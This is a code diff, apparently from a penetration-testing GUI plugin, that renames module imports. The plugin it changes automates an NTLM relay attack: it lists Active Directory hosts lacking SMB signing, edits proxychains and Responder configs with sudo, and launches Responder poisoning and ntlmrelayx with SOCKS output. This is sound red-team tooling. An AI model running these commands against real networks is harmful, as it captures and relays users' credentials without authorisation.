@@ -1,17 +1,17 @@
-import pollenisatorgui.core.Components.Utils as Utils
-from pollenisatorgui.core.Application.Dialogs.ChildDialogQuestion import ChildDialogQuestion
-from pollenisatorgui.core.Application.Dialogs.ChildDialogCombo import ChildDialogCombo
+import pollenisatorgui.core.components.utils as utils
+from pollenisatorgui.core.application.dialogs.ChildDialogQuestion import ChildDialogQuestion
+from pollenisatorgui.core.application.dialogs.ChildDialogCombo import ChildDialogCombo
 import tempfile
 import os
 import shutil
 import tkinter as tk
-from pollenisatorgui.core.Components.apiclient import APIClient
+from pollenisatorgui.core.components.apiclient import APIClient
 
 
 def main(apiclient):
     APIClient.setInstance(apiclient)
     smb_signing_list = apiclient.find("ActiveDirectory", {"infos.signing":"False"}, True)
-    export_dir = Utils.getExportDir()
+    export_dir = utils.getExportDir()
     file_name = os.path.join(export_dir, "relay_list.lst")
     with open(file_name, "w") as f:
         for computer in smb_signing_list:
@@ -28,10 +28,10 @@ def main(apiclient):
     cmd = ""
     if dialog.rvalue == "Yes":
         cmd = 'sudo sed -i -E "s/(socks[4-5]\s+127.0.0.1\s+)[0-9]+/\\11080/gm" /etc/proxychains.conf'
-        Utils.executeInExternalTerm(f"'{cmd}'")
+        utils.executeInExternalTerm(f"'{cmd}'")
     responder_conf = ""
     if shutil.which("locate"):
-        res_code, stdout = Utils.execute("locate Responder.conf", None)
+        res_code, stdout = utils.execute("locate Responder.conf", None)
         if stdout is None or stdout.strip() == "":
             file = tk.filedialog.askopenfilename(" Locate responder conf file please",filetypes=[('Config Files', '*.conf')])
             if file:
@@ -41,15 +41,15 @@ def main(apiclient):
             dialog.app.wait_window(dialog.app)
             if dialog.rvalue is not None:
                 responder_conf = dialog.rvalue.strip()
-                Utils.executeInExternalTerm(f"sudo sed -i -E 's/(HTTP|SMB) = On/\1 = Off/gm' {responder_conf}")
-                Utils.executeInExternalTerm(f"sudo responder -I {dialog.rvalue} -dvw --lm --disable-ess")
+                utils.executeInExternalTerm(f"sudo sed -i -E 's/(HTTP|SMB) = On/\1 = Off/gm' {responder_conf}")
+                utils.executeInExternalTerm(f"sudo responder -I {dialog.rvalue} -dvw --lm --disable-ess")
     cmd = ""
     if dialog.rvalue == "Yes":
         cmd = 'sudo sed -i -E "s/(socks[4-5]\s+127.0.0.1\s+)[0-9]+/\\11080/gm" /etc/proxychains.conf'
-        Utils.executeInExternalTerm(f"'{cmd}'")
+        utils.executeInExternalTerm(f"'{cmd}'")
 
     cmd = f"sudo ntlmrelayx -tf {file_name} -smb2support -socks -l {relaying_loot_path}"
-    Utils.executeInExternalTerm(f"'{cmd}'")
+    utils.executeInExternalTerm(f"'{cmd}'")
     return True, f"Listening ntlmrelay opened, loot directory is here:"+str(relaying_loot_path)+"\n"+ \
             "Don't forget to open Responder with HTTP and SMB disabled\n" + \
                 "Proxychains port should be 1080 (default)"
